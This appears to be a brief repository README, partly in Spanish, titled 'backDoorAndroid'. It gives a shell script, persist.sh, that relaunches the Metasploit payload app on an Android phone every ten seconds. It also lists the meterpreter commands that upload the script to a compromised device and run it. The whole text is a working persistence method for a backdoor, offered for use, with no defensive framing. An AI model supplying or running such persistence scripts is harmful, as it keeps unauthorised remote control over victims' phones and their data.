# backDoorAndroid

archivo persist.sh
#!/bin/sh
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage .MainActivity
sleep 10
done

meterpreter > upload ruta-del-persist.sh
meterpreter > shell
sh /ruta-al-archivo/persist.sh

archivo paso a paso
/metasploit-persistent
